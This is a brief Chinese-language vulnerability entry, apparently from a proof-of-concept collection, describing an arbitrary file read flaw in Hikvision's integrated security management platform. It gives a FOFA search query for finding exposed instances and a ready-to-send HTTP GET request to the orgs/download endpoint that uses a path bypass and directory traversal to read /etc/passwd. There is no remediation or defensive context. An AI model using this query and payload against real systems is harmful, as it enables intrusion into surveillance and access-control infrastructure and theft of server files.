## 海康威视综合安防download存在任意文件读取漏洞

综合安防管理平台是一套“集成化”、“智能化”的平台,通过接入视频监控、一卡通、停车场、报警检测等系统的设备。海康威视集成化综合管理软件平台,可以对接入的视频监控点集中管理,实现统一部署、统一配置、统一管理和统一调度。Hikvision综合安防管理平台/orgManage/v1/orgs/download接口存在任意文件读取漏洞。

## fofa

```
title="综合安防管理平台"
```

## poc

```
GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

